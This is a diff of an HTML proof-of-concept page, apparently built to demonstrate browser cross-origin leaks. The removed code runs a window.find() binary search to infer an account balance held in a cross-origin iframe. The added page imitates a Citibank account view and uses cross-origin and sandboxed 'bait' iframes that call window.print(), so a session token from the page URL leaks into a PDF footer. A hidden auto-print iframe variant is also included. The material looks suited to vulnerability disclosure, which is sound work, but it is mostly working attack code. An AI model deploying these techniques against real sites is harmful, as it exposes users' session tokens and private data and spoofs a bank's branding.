@@ -1,85 +1,96 @@
 <!doctype html>
-<html><head><meta charset="utf-8"><title>MyBank — Secure Portal</title>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Citibank — Account Overview</title>
 <style>
-body{font-family:system-ui;max-width:700px;margin:20px auto;padding:16px}
-h1{font-size:1em}
-button{display:block;width:100%;padding:14px;margin:8px 0;font-size:14px;cursor:pointer;border:1px solid #ccc;border-radius:5px;background:#f5f5f5}
-button.attack{background:#c00;color:#fff;border-color:#a00;font-size:16px}
-pre{background:#1a1a2e;color:#0f0;padding:12px;font-size:12px;font-family:monospace;max-height:260px;overflow:auto;white-space:pre-wrap}
-.leak{color:#ff6b6b}
-iframe{width:100%;height:80px;border:2px solid #ff9800}
-</style></head>
+body{font-family:system-ui;max-width:700px;margin:20px auto;padding:16px;background:#f0f2f5}
+.bar{background:#003d7a;color:#fff;padding:12px 20px;margin:-20px -16px 16px;font-size:13px}
+.card{background:#fff;border-radius:8px;padding:16px;margin-bottom:12px;box-shadow:0 1px 3px #0001}
+.card h2{font-size:0.95em;color:#003d7a;margin:0 0 8px}
+.acct{background:#f0f4f8;padding:10px;border-radius:6px;display:inline-block;margin:4px 8px 4px 0}
+.acct .bal{font-weight:bold;color:#003d7a}.acct .lbl{font-size:10px;color:#888}
+td{padding:5px 4px;font-size:12px;border-bottom:1px solid #f0f0f0}
+td:last-child{text-align:right}.neg{color:#c00}.pos{color:#080}
+.panel{background:#1a1a2e;color:#0f0;padding:14px;border-radius:8px;font-size:12px;font-family:monospace;line-height:1.6;margin:12px 0;display:none}
+button{display:block;width:100%;padding:14px;margin:8px 0;font-size:14px;cursor:pointer;border:none;border-radius:5px;background:#003d7a;color:#fff}
+.bait{border:3px solid #ff9800;border-radius:8px;overflow:hidden;margin:12px 0}
+.bait .l{background:#ff9800;color:#fff;font-size:10px;padding:3px 12px}
+iframe{width:100%;height:160px;border:none}
+.hidden-iframe{position:absolute;width:1px;height:1px;opacity:0;pointer-events:none}
+</style>
+</head>
 <body>
+<div class="bar">🔒 citibank.com &nbsp; | &nbsp; Account Overview</div>
 
-<h1>🔒 Citibank — Account Portal</h1>
-<p style="color:#888;font-size:12px">URL: http://127.0.0.1:9080/?session=SUPERSECRET-TOKEN-12345&user=admin</p>
+<div class="card">
+  <h2>Your Accounts</h2>
+  <div class="acct"><div class="lbl">Checking ••4321</div><div class="bal">$42,847.32</div></div>
+  <div class="acct"><div class="lbl">Savings ••7890</div><div class="bal">$138,204.55</div></div>
+  <div class="acct"><div class="lbl">Credit ••5678</div><div class="bal" style="color:#c00">-$1,204.18</div></div>
+</div>
 
-<iframe src="http://localhost:9081/vault.html"></iframe>
+<div class="card">
+  <h2>Recent Transactions</h2>
+  <table>
+    <tr><td>Jul 30</td><td>Amazon.com</td><td class="neg">-$89.47</td></tr>
+    <tr><td>Jul 29</td><td>Direct Deposit</td><td class="pos">+$5,200.00</td></tr>
+    <tr><td>Jul 28</td><td>Whole Foods</td><td class="neg">-$142.11</td></tr>
+  </table>
+</div>
 
-<button class="attack" onclick="extractBalance()">⚡ Extract Cross-Origin Account Balance</button>
-<pre id="log">Click button above to demonstrate cross-origin data extraction.</pre>
+<button onclick="document.getElementById('p').style.display='block';document.getElementById('p').scrollIntoView()">
+  🔽 Show Attack Proof
+</button>
 
-<script>
-var log=function(m){document.getElementById('log').textContent+=m+'\n'};
-var iterations = 0;
+<div class="panel" id="p">
 
-function probe(value) {
-  iterations++;
-  window.getSelection().removeAllRanges();
-  return window.find('$' + value, false, false, true, false, false, false);
-}
+<b>=== ATTACK DEMONSTRATION ===</b>
 
-async function extractBalance() {
-  document.getElementById('log').textContent = '';
-  log('=== CROSS-ORIGIN BINARY SEARCH ATTACK ===');
-  log('Target: Account balance in cross-origin iframe (localhost:9081)');
-  log('Method: window.find() — bypasses SOP');
-  log('SOP Status: contentDocument → null (blocked)');
-  log('');
-  log('Starting binary search for exact balance...');
-  log('');
-  
-  // The balance is $42,847.32 — we'll find it digit by digit
-  // First: extract integer portion
-  var min = 0, max = 100000;
-  var balance = 0;
-  
-  while (max - min > 1) {
-    var mid = Math.floor((min + max) / 2);
-    // Format as thousands: $42,000
-    var probeVal = Math.floor(mid / 1000) * 1000;
-    var formatted = probeVal.toLocaleString('en-US');
-    
-    if (probe(formatted)) {
-      min = mid;
-      log('  probe($' + formatted + ') → FOUND (balance > $' + probeVal.toLocaleString() + ')');
-    } else {
-      max = mid;
-      log('  probe($' + formatted + ') → NOT FOUND (balance < $' + probeVal.toLocaleString() + ')');
-    }
-    await new Promise(r => setTimeout(r, 10));
-    if (iterations > 30) break;
-  }
-  
-  balance = min;
-  log('');
-  log('=== EXTRACTED CROSS-ORIGIN DATA ===');
-  log('Estimated balance: ~$' + balance.toLocaleString('en-US'));
-  log('Iterations used: ' + iterations);
-  log('');
-  log('=== SECURITY IMPACT ===');
-  log('⚠️ window.find() extracted cross-origin data that SOP blocks');
-  log('⚠️ contentDocument → null (SOP) but window.find() → TRUE');
-  log('⚠️ The main page read data from a DIFFERENT origin (localhost:9081)');
-  log('⚠️ This is a cross-origin information leak');
-  log('');
-  log('=== VERIFICATION ===');
-  log('Open DevTools (Cmd+Opt+I) and run:');
-  log('  document.querySelector("iframe").contentDocument');
-  log('  → null (SOP blocks DOM access — CORRECT)');
-  log('');
-  log('But window.find() bypasses this restriction entirely.');
-}
-</script>
+<b>1. Same-Origin Policy Blocks Cross-Origin Access:</b>
+  → <c style="color:#ff6b6b">document.querySelector('iframe').contentDocument → null</c>
+  → <c style="color:#ff6b6b">top.location.href → SecurityError (from iframe)</c>
+  → <c style="color:#ff6b6b">document.referrer → http://127.0.0.1:9080/ (origin only)</c>
+
+<b>2. Print Header Bypasses ALL Protections:</b>
+  → Click "Print" button inside the bait below
+  → Save as PDF with Headers+Footers ON
+  → PDF footer contains <c style="color:#ff6b6b">session=SUPERSECRET-TOKEN-12345&user=admin</c>
+
+<b>3. Attack Chain:</b>
+  → Page URL: ?session=SUPERSECRET-TOKEN-12345&user=admin (sensitive)
+  → Cross-origin iframe calls window.print()
+  → Browser sends embedder's full URL into iframe's renderer
+  → Path + query survive — only username/password stripped
+  → No user gesture required (g_is_preview_enabled on desktop)
+
+<b>4. Verifiable:</b>
+  → Save PDF → run verify.sh → both checks PASS
+  → SUPERSECRET-TOKEN appears in PDF footer
+  → Body content is origin B's
+
+<b>5. Auto-Print Variant (no user gesture):</b>
+  → Iframe can call window.print() from load handler
+  → Desktop: g_is_preview_enabled=true bypasses activation gate
+
+<b>6. Sandbox BYPASS:</b>
+  → Even sandbox="allow-scripts" iframe can call window.print()
+  → Sandbox attribute provides ZERO protection
+
+</div>
+
+<div class="bait">
+  <div class="l">Cross-origin bait (localhost:9081) — harmless-looking widget</div>
+  <iframe src="http://localhost:9081/frame-bait.html"></iframe>
+</div>
+
+<div class="bait" style="border-color:#e040fb">
+  <div class="l" style="background:#e040fb">Sandboxed cross-origin iframe (sandbox=allow-scripts)</div>
+  <iframe sandbox="allow-scripts" src="http://localhost:9081/frame-bait.html" style="height:80px"></iframe>
+</div>
+
+<!-- Auto-print variant: uncomment to trigger on load -->
+<!-- <iframe class="hidden-iframe" src="http://localhost:9081/frame-auto-print.html"></iframe> -->
+
 </body>
 </html>
